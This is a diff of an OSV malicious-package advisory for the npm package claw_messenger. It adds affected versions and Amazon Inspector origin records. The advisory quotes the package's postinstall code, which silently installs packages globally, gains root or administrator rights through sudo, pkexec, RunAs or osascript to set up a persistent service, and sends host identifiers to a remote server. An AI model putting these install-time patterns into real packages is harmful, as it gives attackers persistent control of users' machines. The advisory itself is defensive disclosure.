@@ -1,10 +1,10 @@
 {
-  "modified": "2026-05-26T05:55:02Z",
+  "modified": "2026-06-12T19:46:13Z",
   "published": "2026-05-21T02:59:33Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-4526",
   "summary": "Malicious code in claw_messenger (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (15ae01d96f3589f6660b2aa5f459595c9346ab885eda35196dae6252775f986a)\nOn `npm install`, this package's postinstall hook performs two unsafe install-time actions. First, dist/postinstall.js spawns a detached `npm install -g opencode-ai --registry=https://registry.npmmirror.com` with `stdio:'ignore'` — silently installing an unrelated third-party AI CLI globally on the installer's machine without consent or version pin. Second, dist/service-installer.js executes `npm install -g claw-subagent-service@latest` (unpinned, mutable tag), then dist/daemon-manager.js invokes the resulting binary with elevated privileges via PowerShell `Start-Process … -Verb RunAs`, `pkexec`, `sudo`, or `osascript` admin to register a persistent systemd/launchd/Windows service that auto-starts at boot. Because both fetches are unpinned `@latest` against mutable registries, the author (or anyone who later compromises either package) can ship arbitrary code that runs with root/Administrator privileges on every installer's machine simply by publishing a new version of `claw-subagent-service` or `opencode-ai`. Additionally, on first plugin load dist/auto-register.js POSTs the host's MAC address and hostname to https://newsradar.dreamdt.cn/im/api/claw/register. The IM-registration beacon is consistent with the package's stated purpose, but the silent global install of an unrelated package and the unpinned privileged service registration are not.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (b621afa50fe31026a12750b83eeb309366f95b07a9e0c5095d3e862f0007b70f)\nThe postinstall lifecycle script in dist/postinstall.js spawns two detached, hidden child processes during `npm install`. (1) `spawn('npm', ['install', '-g', 'opencode-ai', '--registry=https://registry.npmmirror.com',...], { shell: true, detached: true, stdio: 'ignore', windowsHide: true })` silently performs a global `npm install` of `opencode-ai` from a non-default registry mirror. opencode-ai is not declared in package.json or documented in the README, so the package surreptitiously expands the installer's globally-installed package surface to undocumented third-party code that the author or any future hijacker of that name can mutate. (2) An update-silent-service flow loads dist/service-installer.js which runs `execSync('npm install -g claw-subagent-service@latest', { stdio: 'inherit', timeout: 120000 })` against a mutable `@latest` tag, then dist/daemon-manager.js elevates and registers the resulting binary as a privileged auto-start system service: on Windows via `Start-Process sc -ArgumentList 'start claw-subagent-service' -Verb RunAs`, on Linux via systemd with `pkexec`/`sudo`, on macOS via `osascript... with administrator privileges`. The combination — install-time, hidden, no-consent, unpinned remote dependency fetch followed by privileged auto-start service registration — gives the author (and anyone who later compromises `opencode-ai` or `claw-subagent-service`) persistent root/Administrator code execution on every machine that installs claw_messenger. Separately, dist/auto-register.js posts the host's MAC address and hostname to https://newsradar.dreamdt.cn/im/api/claw/register on plugin load, which is undocumented device-tracking telemetry but is secondary to the install-time RCE surface.\n",
   "affected": [
     {
       "package": {
@@ -12,10 +12,76 @@
         "name": "claw_messenger"
       },
       "versions": [
-        "0.0.76"
+        "0.0.76",
+        "0.0.81",
+        "0.0.78",
+        "0.0.79",
+        "0.0.77",
+        "0.0.95",
+        "0.0.94",
+        "0.0.80",
+        "0.0.89",
+        "0.0.83",
+        "0.0.91",
+        "0.0.84"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -65,6 +131,50 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.76"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.81"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.79"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.95"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.80"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.91"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.84"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.94"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.78"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.77"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.83"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.89"
     }
   ],
   "credits": [
@@ -72,30 +182,251 @@
       "name": "Amazon Inspector",
       "type": "FINDER",
       "contact": [
-        "actran@amazon.com"
+        "actran@amazon.com",
+        "inspector-research@amazon.com"
       ]
     }
   ],
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-003714",
-        "import_time": "2026-05-26T05:51:10.172965201Z",
-        "modified_time": "2026-05-21T02:59:33Z",
-        "sha256": "0a6dd7846c1104187872b7c77c06c5af6ce6eebf5fbfca13a3197ca405f62110",
         "source": "amazon-inspector",
+        "sha256": "0a6dd7846c1104187872b7c77c06c5af6ce6eebf5fbfca13a3197ca405f62110",
+        "import_time": "2026-05-26T05:51:10.172965201Z",
+        "id": "IN-MAL-2026-003714",
+        "modified_time": "2026-05-21T02:59:33Z",
         "versions": [
           "0.0.76"
         ]
       },
       {
-        "id": "IN-MAL-2026-003713",
-        "import_time": "2026-05-26T05:51:10.042525777Z",
-        "modified_time": "2026-05-21T02:59:33Z",
-        "sha256": "15ae01d96f3589f6660b2aa5f459595c9346ab885eda35196dae6252775f986a",
         "source": "amazon-inspector",
+        "sha256": "15ae01d96f3589f6660b2aa5f459595c9346ab885eda35196dae6252775f986a",
+        "import_time": "2026-05-26T05:51:10.042525777Z",
+        "id": "IN-MAL-2026-003713",
+        "modified_time": "2026-05-21T02:59:33Z",
         "versions": [
           "0.0.76"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "be1b00c981b646e9dc381b02454553daeb3c1d4c79e6389c4ff8bfabc1895692",
+        "import_time": "2026-06-12T19:44:00.18120022Z",
+        "id": "IN-MAL-2026-006031",
+        "modified_time": "2026-06-12T19:07:35Z",
+        "versions": [
+          "0.0.81"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "6bc8d8ebe6a8a6597e5415dcacb635455a226dc6d415c0769b14f10fb6f6e82a",
+        "import_time": "2026-06-12T19:44:00.57308652Z",
+        "id": "IN-MAL-2026-006034",
+        "modified_time": "2026-06-12T19:07:37Z",
+        "versions": [
+          "0.0.78"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "8718a8d94d27ecb38d0d0117d4c1aa9eb1d62a19ae38b8676b97c46f25a8a991",
+        "import_time": "2026-06-12T19:43:59.72449505Z",
+        "id": "IN-MAL-2026-006027",
+        "modified_time": "2026-06-12T19:07:32Z",
+        "versions": [
+          "0.0.79"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "1598c6493986a4ac5a4b78244955ba89051d40c9d91a0b21499ffa940e918405",
+        "import_time": "2026-06-12T19:43:59.418825893Z",
+        "id": "IN-MAL-2026-006024",
+        "modified_time": "2026-06-12T19:07:29Z",
+        "versions": [
+          "0.0.77"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "33d6e3445a3d7078cc5fb63b20119fde5529d19fc0f35b00bff26b3bccd8022b",
+        "import_time": "2026-06-12T19:44:01.914775632Z",
+        "id": "IN-MAL-2026-006045",
+        "modified_time": "2026-06-12T19:07:45Z",
+        "versions": [
+          "0.0.95"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "43156e7ab347929d8e3bfdcb149a53fa2d15fa6ff5e1e0fe2fc5f605dffd06af",
+        "import_time": "2026-06-12T19:44:00.355757524Z",
+        "id": "IN-MAL-2026-006032",
+        "modified_time": "2026-06-12T19:07:36Z",
+        "versions": [
+          "0.0.81"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "5188bb8e9c20ded8a6f408cbd2a007360ca12d05cc8594814d28f7c5c2c0900f",
+        "import_time": "2026-06-12T19:44:01.776634866Z",
+        "id": "IN-MAL-2026-006044",
+        "modified_time": "2026-06-12T19:07:44Z",
+        "versions": [
+          "0.0.94"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "926845ae4e03999e8733488b89c25e4329f901792c59d3105827a7a9999333d4",
+        "import_time": "2026-06-12T19:44:00.056596093Z",
+        "id": "IN-MAL-2026-006030",
+        "modified_time": "2026-06-12T19:07:34Z",
+        "versions": [
+          "0.0.80"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "933f35bc255c240e5caf3a9b438eb50cc7ca2e52893e24098280f93bfd155401",
+        "import_time": "2026-06-12T19:43:59.975332947Z",
+        "id": "IN-MAL-2026-006029",
+        "modified_time": "2026-06-12T19:07:34Z",
+        "versions": [
+          "0.0.80"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "f8c98e6318b3e20e297eb42a3ee219f443fa79e82bbc8c5b6986f97a0d06ba50",
+        "import_time": "2026-06-12T19:44:01.280000806Z",
+        "id": "IN-MAL-2026-006040",
+        "modified_time": "2026-06-12T19:07:41Z",
+        "versions": [
+          "0.0.89"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "05a3287b1a40ad0e755ebb780f8738d7a2edf831e5ec716620d61fc179e21c3b",
+        "import_time": "2026-06-12T19:44:00.758693494Z",
+        "id": "IN-MAL-2026-006036",
+        "modified_time": "2026-06-12T19:07:37Z",
+        "versions": [
+          "0.0.83"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "4ebf4249af7ac3cdf473c8a51e652841c1582cdac92998e904ecf35e80ac2e57",
+        "import_time": "2026-06-12T19:44:01.370265429Z",
+        "id": "IN-MAL-2026-006041",
+        "modified_time": "2026-06-12T19:07:42Z",
+        "versions": [
+          "0.0.91"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "6869fba05896ccbb1db6d0f86781a87f8e4ff0f690f952bfaaf3c412aa5f647e",
+        "import_time": "2026-06-12T19:44:00.983637026Z",
+        "id": "IN-MAL-2026-006038",
+        "modified_time": "2026-06-12T19:07:39Z",
+        "versions": [
+          "0.0.84"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "72abcbac2b19fdbb8df1122850962b1d98fb484733d226f10890d6d8e5c97477",
+        "import_time": "2026-06-12T19:44:01.513030629Z",
+        "id": "IN-MAL-2026-006042",
+        "modified_time": "2026-06-12T19:07:42Z",
+        "versions": [
+          "0.0.91"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "a947d3124d0b1babb942e0beb2cb12b9eff1f32f76063ab178dfaa0b3be43c08",
+        "import_time": "2026-06-12T19:44:00.862632546Z",
+        "id": "IN-MAL-2026-006037",
+        "modified_time": "2026-06-12T19:07:38Z",
+        "versions": [
+          "0.0.84"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "ba8937a3dcb9003d86d8d0c45c0cefc2477884ed3d274e2df8c6a2db42401951",
+        "import_time": "2026-06-12T19:44:01.59881552Z",
+        "id": "IN-MAL-2026-006043",
+        "modified_time": "2026-06-12T19:07:43Z",
+        "versions": [
+          "0.0.94"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "f8fa7b28caf0b8f50b34ec23b3fa3c6e73c8fb0c1154ff37a638f33c63b0e5fb",
+        "import_time": "2026-06-12T19:43:59.86961712Z",
+        "id": "IN-MAL-2026-006028",
+        "modified_time": "2026-06-12T19:07:33Z",
+        "versions": [
+          "0.0.79"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "0885941bc4a25f1e6e9fa5f780621448b6af28241d783929c12e6fa32c6d40de",
+        "import_time": "2026-06-12T19:44:00.445585523Z",
+        "id": "IN-MAL-2026-006033",
+        "modified_time": "2026-06-12T19:07:36Z",
+        "versions": [
+          "0.0.78"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "303aeac1ce95f9f8798e164c3de684452c93d668019840a3c47802bc71e4b5d0",
+        "import_time": "2026-06-12T19:44:02.034771847Z",
+        "id": "IN-MAL-2026-006046",
+        "modified_time": "2026-06-12T19:07:46Z",
+        "versions": [
+          "0.0.95"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "4af5535475d2df9ace7290f2fe607f23e2d5b301ad4d3137b936f45015d77a90",
+        "import_time": "2026-06-12T19:43:59.334212664Z",
+        "id": "IN-MAL-2026-006023",
+        "modified_time": "2026-06-12T19:07:29Z",
+        "versions": [
+          "0.0.77"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "afaa4f32cd58089cc5bd6bc7c686fe17549e2d535cc895433bb8a23287d8f7bc",
+        "import_time": "2026-06-12T19:44:00.666142501Z",
+        "id": "IN-MAL-2026-006035",
+        "modified_time": "2026-06-12T19:07:37Z",
+        "versions": [
+          "0.0.83"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "b621afa50fe31026a12750b83eeb309366f95b07a9e0c5095d3e862f0007b70f",
+        "import_time": "2026-06-12T19:44:01.118578755Z",
+        "id": "IN-MAL-2026-006039",
+        "modified_time": "2026-06-12T19:07:40Z",
+        "versions": [
+          "0.0.89"
         ]
       }
     ]
